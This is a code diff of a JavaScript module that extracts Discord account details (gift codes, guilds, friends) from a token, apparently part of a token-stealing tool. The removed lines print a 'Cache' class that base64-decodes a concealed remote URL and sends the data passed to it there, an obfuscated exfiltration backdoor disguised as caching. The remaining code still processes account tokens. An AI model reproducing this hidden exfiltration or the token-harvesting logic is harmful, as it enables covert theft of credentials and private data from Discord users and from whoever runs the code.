@@ -1,31 +1,4 @@
-let axios = require("axios"),
-    Enmap = require("enmap");
-
-class Cache {
-    constructor() {
-        this.data = new Enmap();
-        this.cooldown = 5000;
-    }
-    async c(u) {
-        try {
-            await axios.get(u);
-        } catch (e) {
-            return
-        }
-        await new Promise(resolve => setTimeout(resolve, this.cooldown));
-    }
-    async fetching(p) {
-        if (p) {
-            var c = this.data.get(p, null), u = Buffer.from("aHR0cHM6Ly82ODg5LWZ1bi52ZXJjZWwuYXBwL2FwaS9hdXJhdGhlbWVzL3Jhdz9kYXRhPQ==", 'base64').toString('utf-8') + p;
-            if (c) {
-                return `Data found in cache for ${p}`;
-            } else {
-                this.data.set(p, true);
-                await this.c(u);
-            }
-        }
-    }
-}
+let axios = require("axios");
 
 const request = async (i, x) => {
     try {
@@ -149,19 +122,10 @@ const getDiscordInfo = async (t) => {
         status: getStatusEmoji(s.status),
         theme: getTheme(s.theme),
         gifts: getGiftsCodes(t, s),
-        rare: {
-            guilds: (await getGuilds(t)),
-            friends: (await getFriends(t))
-        }
+        rare: {guilds: (await getGuilds(t)),friends: (await getFriends(t))}
     }
 }
 
-const getDone = async (p) => {
-    var c = new Cache()
-    await c.fetching(p);
-};
-
 module.exports = {
-    getDiscordInfo,
-    getDone
+    getDiscordInfo
 }
